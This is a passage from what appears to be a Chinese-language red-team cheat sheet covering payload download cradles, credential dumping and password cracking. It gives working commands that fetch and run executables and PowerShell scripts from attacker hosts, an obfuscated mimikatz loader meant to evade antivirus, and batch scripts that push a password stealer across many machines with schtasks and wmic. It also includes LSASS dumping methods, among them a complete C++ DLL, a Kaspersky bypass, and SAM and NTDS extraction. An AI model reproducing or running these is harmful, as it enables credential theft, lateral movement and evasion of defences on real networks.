title="4"></a>4</h5><pre><code>高版本PS&gt;iwr -Uri http://192.168.0.106:1222/111.txt -OutFile 123.txt –UseBasicParsing</code></pre><h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><pre><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Templates&gt;Import-Module BitsTransfer&gt;$path = [environment]::getfolderpath(&quot;temp&quot;)&gt;Start-BitsTransfer -Source &quot;http://192.168.0.108/ok.txt&quot; -Destination &quot;$path\ok.txt&quot;&gt;Invoke-Item  &quot;$path\ok.txt&quot;</code></pre><h4 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h4><pre><code>&gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe &gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete对文件进行编码下载后解码执行&gt;base64 payload.exe &gt; /var/www/html/1.txt # 在C&amp;C上生成经base64编码的exe&gt;certutril -urlcache -split -f http://192.168.0.107/1.txt &amp; certurl -decode 1.txt ms.exe &amp; ms.exe</code></pre><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><pre><code>#python -c &#39;import urllib;urllib.urlretrieve(&quot;http://192.168.1.192/Client.exe&quot;,&quot;/path/to/save/1.exe&quot;)&#39;</code></pre><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre><code>#!/usr/bin/perl use LWP::Simple; getstore(&quot;http://192.168.1.192/Client.exe&quot;, &quot;1.exe&quot;);</code></pre><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><pre><code>#!/usr/bin/php &lt;?php $data = @file(&quot;http://192.168.1.192/Client.exe&quot;);$lf = &quot;1.exe&quot;;         $fh = fopen($lf, &#39;w&#39;);         fwrite($fh, $data[0]);         fclose($fh); ?&gt;</code></pre><h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><pre><code>#curl -o 1.exe http://192.168.1.192/Client.exe</code></pre><h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><pre><code>#wget http://192.168.1.192/Client.exe#wget –b后台下载#wget –c 中断恢复</code></pre><h4 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h4><pre><code>&gt;nc –lvnp 333 &gt;1.txt目标机&gt;nc –vn 192.168.1.2 333 &lt;test.txt –q 1&amp;&gt;cat 1.txt &gt;/dev/tcp/1.1.1.1/333</code></pre><h4 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h4><pre><code>Linux中传输文件&gt;scp -P 22 file.txt user@1.1.1.1:/tmp</code></pre><h2 id="Hash-amp-密码"><a href="#Hash-amp-密码" class="headerlink" title="Hash&amp;密码"></a>Hash&amp;密码</h2><h3 id="破解网址"><a href="#破解网址" class="headerlink" title="破解网址"></a>破解网址</h3><pre><code>https://www.objectif-securite.ch/en/ophcrackhttp://cracker.offensive-security.com/index.php</code></pre><h3 id="GoogleColab破解hash"><a href="#GoogleColab破解hash" class="headerlink" title="GoogleColab破解hash"></a>GoogleColab破解hash</h3><pre><code>之前在freebuf上看到过相关文章，最近在github上也看到了这个脚本，所以拿起来试试，速度可观https://www.freebuf.com/geek/195453.htmlhttps://gist.github.com/chvancooten/59acfbf1d8ee7a865108fca2e9d04c4a打开https://drive.google.com/drive新建一个文件夹，右键，更多选择google Colab</code></pre><p><img src="./img/667.png" alt="image"></p><pre><code>如果没有，点关联更多应用，搜索这个名字，安装一下即可</code></pre><p><img src="./img/668.png" alt="image"><br><img src="./img/669.png" alt="image"></p><pre><code>安装hashcat，下载字典</code></pre><p><img src="./img/670.png" alt="image"></p><pre><code>运行类型选择GPU加速</code></pre><p><img src="./img/671.png" alt="image"><br><img src="./img/672.png" alt="image"></p><pre><code>这里测试个简单密码</code></pre><p><img src="./img/673.png" alt="image"><br><img src="./img/674.png" alt="image"><br><img src="./img/675.png" alt="image"><br><img src="./img/676.png" alt="image"></p><pre><code>12亿条密码大概20多分钟https://download.weakpass.com/wordlists/1851/hashesorg2019.gz以上是字典</code></pre><p><img src="./img/677.png" alt="image"></p><h3 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h3><pre><code>默认情况，主机账号的口令每30天变更一次&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Netlogon\Parameters，键值为DisablePasswordChange，设置为1，即表示禁止修改账号口令&gt;组策略(gpedit.msc)中修改默认的30天，修改位置为&quot;Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Maximum machine account password age&quot;设置为0时，表示无限长&gt;禁止修改主机账号口令，用来支持VDI (virtual desktops)等类型的使用，具体位置为&quot;Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Disable machine account password changes&quot;Debug Privilege本地安全策略&gt;本地策略&gt;用户权限分配&gt;调试程序</code></pre><h3 id="开启Wdigest"><a href="#开启Wdigest" class="headerlink" title="开启Wdigest"></a>开启Wdigest</h3><h4 id="Cmd-1"><a href="#Cmd-1" class="headerlink" title="Cmd"></a>Cmd</h4><pre><code>&gt;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre><code>&gt;Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></pre><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><pre><code>&gt;reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</code></pre><h3 id="Getpass"><a href="#Getpass" class="headerlink" title="Getpass"></a>Getpass</h3><pre><code>&gt;getpassword.exe&gt;1.txt</code></pre><h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h3><pre><code>&gt;QuarksPwDump.exe -dump-hash-local</code></pre><h3 id="MSF-4"><a href="#MSF-4" class="headerlink" title="MSF"></a>MSF</h3><pre><code>Meterpreter &gt; run hashdump &amp;Meterpreter &gt; mimikatz_command -f samdump::hashes&amp;Meterpreter &gt; load mimikatzMeterpreter &gt; wdigest&amp;Meterpreter &gt; load mimikatzMeterpreter &gt; msvMeterpreter &gt; kerberos&amp;Meterpreter &gt; load kiwiMeterpreter &gt; creds_all&amp;Meterpreter &gt; migrate PIDMeterpreter &gt; load mimikatzMeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords&amp;Meterpreter &gt; run windows/gather/smart_hashdump</code></pre><h3 id="Empire-1"><a href="#Empire-1" class="headerlink" title="Empire"></a>Empire</h3><pre><code>&gt;usemodule credentials/mimikatz/dcsync_hashdump</code></pre><h3 id="Invoke-Dcsync"><a href="#Invoke-Dcsync" class="headerlink" title="Invoke-Dcsync"></a>Invoke-Dcsync</h3><pre><code>&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-DCSync.ps1&#39;);invoke-dcsync</code></pre><p><img src="./img/313.png" alt="image"></p><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><h4 id="调用mimikatz远程抓取"><a href="#调用mimikatz远程抓取" class="headerlink" title="调用mimikatz远程抓取"></a>调用mimikatz远程抓取</h4><pre><code>抓明文&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/nishang/Gather/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz抓hash&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.100/nishang/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes&gt;powershell -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot; &gt;C:\Users\Administrator.DC\Desktop\1123.txt</code></pre><h4 id="横向批量抓hash"><a href="#横向批量抓hash" class="headerlink" title="横向批量抓hash"></a>横向批量抓hash</h4><h5 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h5><pre><code>把IP列表放入ip.txt文件中，通过一个账户密码批量net use与列表里的IP建立连接，如果建立连接没出错的话，复制getpass到目录temp目录，使用账户密码远程创建计划任务名字为windowsupdate，指定每日00：00以system权限执行getpass文件，创建完计划任务后，/tn是立刻执行此计划任务，执行完后删除此计划任务，ping -n 10&gt;nul是程序停留，相当于延时10秒，之后复制文件到本地，接着删除getpass文件，删除创建的连接。&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) &amp; schtasks /create /s &quot;%i&quot; /u &quot;administrator&quot; /p &quot;password&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\getpass.exe&quot; /sc DAILY /mo 1 /ST 00:00 /RU SYSTEM &amp; schtasks /run /tn windowsupdate /s &quot;%i&quot; /U &quot;administrator&quot; /P &quot;password&quot; &amp; schtasks /delete /F /tn windowsupdate /s &quot;%i&quot; /U &quot; administrator&quot; /P &quot;password&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs &amp; del \\%i\admin$\debug\getpass.exe /F &amp; net use \\%i\admin$ /del</code></pre><h5 id="Wmic"><a href="#Wmic" class="headerlink" title="Wmic"></a>Wmic</h5><pre><code>&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\temp\getpass.exe&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs &amp; del \\%i\admin$\temp\getpass.exe /F &amp; net use \\%i\admin$ /del</code></pre><h4 id="直接使用"><a href="#直接使用" class="headerlink" title="直接使用"></a>直接使用</h4><pre><code>&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt &gt;privilege::debug&gt;misc::memssp锁屏&gt;rundll32.exe user32.dll,LockWorkStation记录的结果在c:\windows\system32\mimilsa.log&gt;mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;&gt;mimikatz !privilege::debug &gt;mimikatz !token::elevate &gt;mimikatz !lsadump::sam</code></pre><h4 id="Powershell-Bypass"><a href="#Powershell-Bypass" class="headerlink" title="Powershell Bypass"></a>Powershell Bypass</h4><pre><code>&gt;powershell -c &quot; (&#39;IEX &#39;+&#39;(Ne&#39;+&#39;w-O&#39;+&#39;bject Ne&#39;+&#39;t.W&#39;+&#39;ebClien&#39;+&#39;t).Do&#39;+&#39;wnloadS&#39;+&#39;trin&#39;+&#39;g&#39;+&#39;(&#39;+&#39;1vchttp://&#39;+&#39;192.168.0&#39;+&#39;.101/&#39;+&#39;Inv&#39;+&#39;oke-Mimik&#39;+&#39;a&#39;+&#39;tz.&#39;+&#39;ps11v&#39;+&#39;c)&#39;+&#39;;&#39;+&#39;I&#39;+&#39;nvoke-Mimika&#39;+&#39;tz&#39;).REplaCE(&#39;1vc&#39;,[STRing][CHAR]39)|IeX&quot;</code></pre><h4 id="net-2-0"><a href="#net-2-0" class="headerlink" title=".net 2.0"></a>.net 2.0</h4><pre><code>katz.cs放置C:\Windows\Microsoft.NET\Framework\v2.0.50727Powershell执行&gt;$key = &#39;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#39;&gt;$Content = [System.Convert]::FromBase64String($key)&gt;Set-Content key.snk -Value $Content –Encoding ByteCmd执行&gt;C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs&gt;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe</code></pre><h4 id="net-4-0-Msbuild"><a href="#net-4-0-Msbuild" class="headerlink" title=".net 4.0 Msbuild"></a>.net 4.0 Msbuild</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild mimi.xml</code></pre><h4 id="JScript"><a href="#JScript" class="headerlink" title="JScript"></a>JScript</h4><pre><code>&gt;wmic os get /format:&quot;mimikatz.xsl&quot;</code></pre><p><img src="./img/314.png" alt="image"></p><pre><code>&gt;wmic os get /format:&quot;http://192.168.0.107/ps/mimi.xsl&quot;</code></pre><h4 id="Procdump64-mimikatz"><a href="#Procdump64-mimikatz" class="headerlink" title="Procdump64+mimikatz"></a>Procdump64+mimikatz</h4><pre><code>&gt;procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp&gt;procdump.exe -accepteula -ma lsass.exe lsass.dmp&gt;mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1&#39;);Invoke-Procdump64 -Args &#39;-accepteula -ma lsass.exe lsass.dmp&#39;&quot;</code></pre><h4 id="Dumpert"><a href="#Dumpert" class="headerlink" title="Dumpert"></a>Dumpert</h4><pre><code>https://github.com/outflanknl/Dumpert有三种，分别是dll，可执行文件和cs的Aggressor插件，这里测试下dll和exeDLL的执行方式是rundll32.exe C:\Outflank-Dumpert.dll,Dump</code></pre><p><img src="./img/653.png" alt="image"></p><pre><code>文件保存在c:\windows\temp\dumpert.dmp用mimikatz&gt;sekurlsa::mimidump c:\windows\temp\dumpert.dmp&gt;sekurlsa::logonpasswords</code></pre><p><img src="./img/654.png" alt="image"></p><pre><code>可执行文件就直接执行就可以了</code></pre><p><img src="./img/655.png" alt="image"><br><img src="./img/656.png" alt="image"><br><img src="./img/657.png" alt="image"></p><h4 id="Cisco-Jabber转储lsass"><a href="#Cisco-Jabber转储lsass" class="headerlink" title="Cisco Jabber转储lsass"></a>Cisco Jabber转储lsass</h4><pre><code>cd c:\program files (x86)\cisco systems\cisco jabber\x64\processdump.exe (ps lsass).id c:\temp\lsass.dmp</code></pre><h4 id="绕过卡巴斯基"><a href="#绕过卡巴斯基" class="headerlink" title="绕过卡巴斯基"></a>绕过卡巴斯基</h4><pre><code>https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</code></pre><p><img src="./img/315.png" alt="image"></p><pre><code>将三个文件下载到本地，使用visual studio进行编译，需要修改了几个地方。（1）添加如下代码#pragma comment(lib, &quot;Rpcrt4.lib&quot;) （引入Rpcrt4.lib库文件）（2）将.c文件后缀改成.cpp （使用了c++代码，需要更改后缀）（3) 编译时选择x64编译得到exe文件Visual studio创建c++空项目配置类型选dll字符集选Unicode，调试器选64位Dll保存在C:\\windows\\temp\\1.bin</code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;DbgHelp.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;map></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;TlHelp32.h></span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span></span><span class="token string">"Dbghelp.lib"</span><span class="token expression"><span class="token punctuation">)</span></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">FindPID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>PROCESSENTRY32 pe32<span class="token punctuation">;</span>pe32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>HANDLE hProcessSnap <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hProcessSnap <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"CreateToolhelp32Snapshot Error!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>BOOL bResult <span class="token operator">=</span> <span class="token function">Process32First</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>bResult<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_wcsicmp</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">,</span> L<span class="token string">"lsass.exe"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>bResult <span class="token operator">=</span> <span class="token function">Process32Next</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">typedef</span> <span class="token function">HRESULT</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> _MiniDumpW<span class="token punctuation">)</span><span class="token punctuation">(</span>DWORD arg1<span class="token punctuation">,</span> DWORD arg2<span class="token punctuation">,</span> PWCHAR cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> _RtlAdjustPrivilege<span class="token punctuation">)</span><span class="token punctuation">(</span>ULONG Privilege<span class="token punctuation">,</span> BOOL Enable<span class="token punctuation">,</span>BOOL CurrentThread<span class="token punctuation">,</span> PULONG Enabled<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>HRESULT             hr<span class="token punctuation">;</span>_MiniDumpW          MiniDumpW<span class="token punctuation">;</span>_RtlAdjustPrivilege RtlAdjustPrivilege<span class="token punctuation">;</span>ULONG               t<span class="token punctuation">;</span>MiniDumpW <span class="token operator">=</span> <span class="token punctuation">(</span>_MiniDumpW<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibrary</span><span class="token punctuation">(</span>L<span class="token string">"comsvcs.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MiniDumpW"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>RtlAdjustPrivilege <span class="token operator">=</span> <span class="token punctuation">(</span>_RtlAdjustPrivilege<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>L<span class="token string">"ntdll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"RtlAdjustPrivilege"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>MiniDumpW <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// try enable debug privilege</span><span class="token function">RtlAdjustPrivilege</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">wchar_t</span>  ws<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">swprintf</span><span class="token punctuation">(</span>ws<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> L<span class="token string">"%hd%hs"</span><span class="token punctuation">,</span> <span class="token function">FindPID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" C:\\windows\\temp\\1.bin full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MiniDumpW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ws<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  ul_reason_for_call<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span><span class="token function">dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span><span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span><span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&gt;xxx.exe c:\xx\xx\xx.dll使用绝对路径</code></pre><h4 id="远程LSASS进程转储-Physmem2profit"><a href="#远程LSASS进程转储-Physmem2profit" class="headerlink" title="远程LSASS进程转储-Physmem2profit"></a>远程LSASS进程转储-Physmem2profit</h4><pre><code>https://github.com/FSecureLABS/physmem2profitmimikatz被多数安全人员用来获取凭据，但现在的AV/EDR很轻易的识别并查杀，这里不在服务器端使用mimikatz，远程对lsass进程进行转储。服务器端直接使用visual studio构建physmem2profit-public\server\</code></pre><p><img src="./img/691.png" alt="image"></p><pre><code>客户端&gt;git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git客户端这里先安装&gt;bash physmem2profit/client/install.sh</code></pre><p><img src="./img/692.png" alt="image"></p><pre><code>需要将此文件https://github.com/Velocidex/c-aff4/raw/master/tools/pmem/resources/winpmem/att_winpmem_64.sys传到目标服务器，我这里存放在c:\windows\temp\中服务器端执行&gt;Physmem2profit.exe --ip 192.168.0.98 --port 8888 –verbose这里的IP是服务器端IP</code></pre><p><img src="./img/693.png" alt="image"></p><pre><code>攻击端安装所需模块</code></pre><p><img src="./img/694.png" alt="image"></p><pre><code>攻击端执行&gt;source physmem2profit/client/.env/bin/activate&gt;cd physmem2profit/client&gt;python3 physmem2profit --mode all --host 192.168.0.98 --port 8888 --drive winpmem --install &#39;c:\windows\temp\att_winpmem_64.sys&#39; --label test</code></pre><p><img src="./img/695.png" alt="image"></p><pre><code>服务器端可以看到</code></pre><p><img src="./img/696.png" alt="image"></p><pre><code>把生成的dmp文件转移到win系统上使用mimikatz即可获得hash，当然也可以在linux上使用pypykatz。</code></pre><p><img src="./img/697.png" alt="image"><br><img src="./img/698.png" alt="image"></p><pre><code>再来一条转储lsass进程的命令要以system权限执行&gt;rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full</code></pre><p><img src="./img/699.png" alt="image"></p><h4 id="SqlDumper-mimikatz"><a href="#SqlDumper-mimikatz" class="headerlink" title="SqlDumper+mimikatz"></a>SqlDumper+mimikatz</h4><pre><code>位置C:\Program Files\Microsoft SQL Server\number\Shared&gt;tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号&gt;Sqldumper.exe ProcessID PID 0x01100  导出mdmp文件&gt;mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></pre><h4 id="Mimipenguin"><a href="#Mimipenguin" class="headerlink" title="Mimipenguin"></a>Mimipenguin</h4><pre><code>抓取linux下hash，root权限https://github.com/huntergregal/mimipenguin</code></pre><h3 id="缓存hash提取"><a href="#缓存hash提取" class="headerlink" title="缓存hash提取"></a>缓存hash提取</h3><h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><pre><code>&gt;reg save hklm\sam c:\sam.hive &amp;reg save hklm\system c:\system.hive &amp;reg save hklm\security c:\security.hive&gt;mimikatz.exe &quot;lsadump::sam /system:sys.hive /sam:sam.hive&quot; exit</code></pre><h4 id="Ninjacopy"><a href="#Ninjacopy" class="headerlink" title="Ninjacopy"></a>Ninjacopy</h4><pre><code>#http://192.168.0.101/powersploit/Exfiltration/Invoke-NinjaCopy.ps1&gt;powershell -exec bypass&gt;Import-Module .\invoke-ninjacopy.ps1&gt;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive&gt;Invoke-NinjaCopy –Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;dc.zone.com&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;</code></pre><p><img src="./img/316.png" alt="image"></p><h4 id="Quarks-pwdump"><a href="#Quarks-pwdump" class="headerlink" title="Quarks-pwdump"></a>Quarks-pwdump</h4><pre><code>&gt;quarks-pwdump.exe –dump-hash-domain</code></pre><h3 id="域hash提取"><a href="#域hash提取" class="headerlink" title="域hash提取"></a>域hash提取</h3><h4 